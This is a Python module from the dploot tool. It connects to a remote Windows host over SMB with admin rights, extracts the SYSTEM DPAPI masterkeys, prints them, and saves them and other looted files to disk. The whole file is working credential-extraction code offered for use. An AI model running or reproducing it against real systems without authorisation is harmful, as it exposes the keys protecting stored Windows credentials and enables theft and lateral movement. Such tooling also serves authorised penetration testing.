import argparse
from binascii import unhexlify
import logging
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
from dploot.triage.masterkeys import MasterkeysTriage


NAME = "machinemasterkeys"


class MachineMasterkeysAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputfile = None
        self.outputdir = None
        
        self.dpapi_system_key = {}
        if self.options.dpapi_system_key is not None and self.options.dpapi_system_key != "":
            correl_table = {"dpapi_machinekey":"MachineKey","dpapi_userkey":"UserKey"}
            self.dpapi_system_key = {correl_table[k] :unhexlify(v[2:]) for k, v in (elem.split(":") for elem in options.dpapi_system_key.split(","))}

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        if self.options.outputfile is not None and self.options.outputfile != "":
            self.outputfile = self.options.outputfile

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )
        if self.is_admin:
            fd = (
                open(self.outputfile + ".mkf", "a+")
                if self.outputfile is not None
                else None
            )

            def masterkey_callback(masterkey):
                masterkey.dump()
                if fd is not None:
                    fd.write(str(masterkey) + "\n")

            triage = MasterkeysTriage(
                target=self.target,
                conn=self.conn,
                per_masterkey_callback=masterkey_callback,
                dpapiSystem=self.dpapi_system_key
            )
            logging.info("Triage SYSTEM masterkeys\n")
            triage.triage_system_masterkeys()
            if self.outputfile is not None:
                logging.critical("Writting masterkeys to %s.mkf" % self.outputfile)
                fd.close()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin


def entry(options: argparse.Namespace) -> None:
    a = MachineMasterkeysAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump system masterkey from local or remote target"
    )

    group = subparser.add_argument_group("machinemasterkeys options")

    group.add_argument(
        "-outputfile",
        action="store",
        help=("Export keys to file"),
    )

    group.add_argument(
        "-dpapi-system-key",
        action="store",
        metavar="dpapi_machinekey:0x0123456789abcdef0123456789abcdef01234567,dpapi_userkey:0x0123456789abcdef0123456789abcdef01234567",
        help=("Use custom DPAPI SYSTEM keys"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
